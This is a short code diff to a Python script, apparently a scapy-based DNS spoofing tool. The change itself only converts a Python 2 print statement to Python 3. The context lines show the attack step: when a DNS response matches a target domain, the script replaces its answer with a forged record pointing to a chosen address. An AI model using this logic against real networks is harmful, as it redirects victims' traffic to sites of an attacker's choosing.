@@ -16,8 +16,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if options.swebsite + "." == qname:
-            print
-            "[+] Spoofing Target"
+            print("[+] Spoofing Target")
             answer = scapy.DNSRR(rrname=qname, rdata=options.dwebsite)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
